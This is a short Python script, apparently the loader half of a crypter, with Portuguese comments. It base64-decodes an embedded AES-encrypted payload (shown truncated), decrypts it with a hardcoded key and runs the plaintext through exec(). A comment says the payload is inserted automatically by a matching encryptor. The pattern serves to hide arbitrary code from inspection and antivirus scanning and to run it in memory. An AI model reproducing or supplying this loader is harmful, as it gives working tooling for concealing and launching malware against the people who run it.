# loader_embedded.py
from Crypto.Cipher import AES
import base64
import hashlib
import tempfile

# PAYLOAD_ENCRYPTED será substituído automaticamente
PAYLOAD_ENCRYPTED = b"""TIXkRJHwFvtVTd8ZrpUtQMl8..."""

def unpad(data):
    return data.rstrip(b' ')

def decrypt_payload(data, key_str):
    key = hashlib.sha256(key_str.encode()).digest()
    data = base64.b64decode(data)
    iv = data[:16]
    ciphertext = data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = unpad(cipher.decrypt(ciphertext))
    return plaintext

def run():
    key = "senhaforte123"  # mesma chave usada no encryptor
    decrypted = decrypt_payload(PAYLOAD_ENCRYPTED, key)
    exec(decrypted.decode(), {"__builtins__": __builtins__})

if __name__ == "__main__":
    run()
